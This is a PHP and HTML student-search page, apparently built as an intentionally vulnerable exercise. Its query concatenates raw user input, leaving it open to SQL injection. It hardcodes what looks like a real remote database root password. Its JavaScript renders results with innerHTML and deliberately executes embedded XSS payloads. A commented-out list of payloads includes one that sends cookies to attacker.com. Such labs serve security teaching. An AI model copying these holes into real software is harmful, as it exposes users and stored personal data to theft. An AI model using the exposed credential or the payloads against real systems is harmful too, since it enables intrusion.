<?php
// Check if a search term has been submitted via a POST request
if (isset($_POST['search'])) {
    // INSECURE CONNECTION - credentials hardcoded
    $connection = mysqli_connect('yamabiko.proxy.rlwy.net', 'root', 'GMnExWwRKkXhUcodjLInPtoQKwdkkyNN', 'cyberv3', 18491);

    if (!$connection) {
        die('Database connection failed: ' . mysqli_connect_error());
    }

    // VULNERABLE TO SQL INJECTION - no input sanitization
    $searchTerm = $_POST['search']; // Directly using user input
    
    // VULNERABLE QUERY - concatenating user input directly
    $query = "SELECT * FROM students WHERE name LIKE '%$searchTerm%' OR student_id LIKE '%$searchTerm%'";
    $result = mysqli_query($connection, $query);

    $students = [];
    if ($result) {
        while ($row = mysqli_fetch_assoc($result)) {
            $students[] = $row;
        }
    }

    header('Content-Type: application/json');
    echo json_encode(['students' => $students]);

    mysqli_close($connection);

} else {
    // This part of the script displays the HTML UI when the page is first loaded.
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Student Search - Vulnerable to SQLi and XSS</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f3f4f6;
        }
        .table-container {
            overflow-x: auto;
            max-height: 70vh;
            width: 100%;
        }
        table {
            min-width: 1000px;
            width: 100%;
        }
        th {
            position: sticky;
            top: 0;
            background-color: #f1f5f9;
            z-index: 10;
        }
        .vulnerability-info {
            background-color: #ffedd5;
            border-left: 4px solid #ea580c;
        }
        .hack-examples {
            background-color: #fee2e2;
            border-left: 4px solid #dc2626;
        }
        /* XSS popup styling */
        .xss-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border: 2px solid red;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            z-index: 1000;
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen">
    <div class="container mx-auto p-4">
        <div class="bg-white p-8 rounded-lg shadow-lg w-full">
            <h1 class="text-3xl font-bold text-center mb-2 text-gray-800">Student Search</h1>
            <p class="text-center text-red-600 font-bold mb-6">VULNERABLE TO SQL INJECTION AND XSS</p>
            
            <!-- <div class="vulnerability-info p-4 rounded-lg mb-6">
                <h2 class="text-xl font-semibold text-orange-700">Educational Purpose Only</h2>
                <p class="mt-2">This page is intentionally vulnerable for security testing in a controlled environment.</p>
            </div>
            
            <div class="hack-examples p-4 rounded-lg mb-6">
                <h3 class="text-lg font-semibold text-red-700">Try these XSS examples in the search box:</h3>
                <ul class="list-disc pl-5 mt-2">
                    <li>Basic XSS: <code class="bg-gray-200 p-1 rounded">&lt;img src=x onerror=alert('XSS1')&gt;</code></li>
                    <li>Steal Cookies: <code class="bg-gray-200 p-1 rounded">&lt;img src=x onerror="alert('Cookies: '+document.cookie)"&gt;</code></li>
                    <li>Redirect: <code class="bg-gray-200 p-1 rounded">&lt;img src=x onerror="window.location='https://attacker.com/?stolen='+document.cookie"&gt;</code></li>
                </ul>
            </div> -->

            <form id="searchForm" class="flex items-center space-x-4 mb-8">
                <input type="text" id="searchInput" placeholder="Enter name or ID or XSS payload..." class="flex-grow p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
                <button type="submit" class="bg-blue-600 text-white p-3 rounded-lg hover:bg-blue-700 transition duration-300">Search</button>
            </form>

            <div id="results" class="w-full">
                <div id="studentsResults" class="hidden">
                    <h2 class="text-2xl font-semibold text-gray-700 mb-4">Students</h2>
                    <div class="table-container border border-gray-200 rounded-lg shadow">
                        <table class="w-full">
                            <thead class="bg-gray-50">
                                <tr>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">No</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Roll</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Name</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Semester</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Section</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Enroll Date</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">DOB</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Gender</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Address</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Phone</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">NRC</th>
                                    <th class="px-4 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Status</th>
                                </tr>
                            </thead>
                            <tbody id="studentsList" class="bg-white divide-y divide-gray-200"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <div id="loading" class="text-center hidden mt-4">
                <p class="text-gray-500">Searching...</p>
            </div>
            <div id="error" class="text-center text-red-500 hidden mt-4"></div>
        </div>
    </div>

    <script>
        // Function to execute XSS payloads that don't work with innerHTML
        function executeXSS(payload) {
            if (payload.includes('onerror') || payload.includes('javascript:')) {
                const div = document.createElement('div');
                div.innerHTML = payload;
                document.body.appendChild(div);
            }
        }

        document.getElementById('searchForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const searchTerm = document.getElementById('searchInput').value;
            const studentsResultsDiv = document.getElementById('studentsResults');
            const studentsList = document.getElementById('studentsList');
            const loadingDiv = document.getElementById('loading');
            const errorDiv = document.getElementById('error');

            studentsList.innerHTML = '';
            studentsResultsDiv.classList.add('hidden');
            errorDiv.classList.add('hidden');
            loadingDiv.classList.remove('hidden');

            // VULNERABLE TO XSS - we're not sanitizing the output
            fetch('search.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `search=${encodeURIComponent(searchTerm)}`
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                loadingDiv.classList.add('hidden');
                
                // Display students - VULNERABLE TO XSS
                if (data.students && data.students.length > 0) {
                    studentsResultsDiv.classList.remove('hidden');
                    data.students.forEach(student => {
                        const tr = document.createElement('tr');
                        // Using innerHTML instead of textContent makes this vulnerable to XSS
                        tr.innerHTML = `
                            <td class="px-4 py-2 whitespace-nowrap">${student.no || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.roll || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.name || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.semester || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.section || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.enroll_date || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.dob || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.gender || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.address || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.phone || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.nrc || 'N/A'}</td>
                            <td class="px-4 py-2 whitespace-nowrap">${student.status || 'N/A'}</td>
                        `;
                        studentsList.appendChild(tr);
                        
                        // Execute any XSS payloads that might be in the data
                        Object.values(student).forEach(value => {
                            if (typeof value === 'string' && (value.includes('<img') || value.includes('onerror'))) {
                                executeXSS(value);
                            }
                        });
                    });
                }
                
                if (data.students.length === 0) {
                    errorDiv.textContent = 'No results found.';
                    errorDiv.classList.remove('hidden');
                    
                    // If no results found, try to execute the search term as XSS if it contains payload
                    if (searchTerm.includes('<img') || searchTerm.includes('onerror')) {
                        executeXSS(searchTerm);
                    }
                }

            })
            .catch(error => {
                loadingDiv.classList.add('hidden');
                errorDiv.textContent = 'Failed to fetch data. Please check your network and server logs.';
                errorDiv.classList.remove('hidden');
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
<?php
}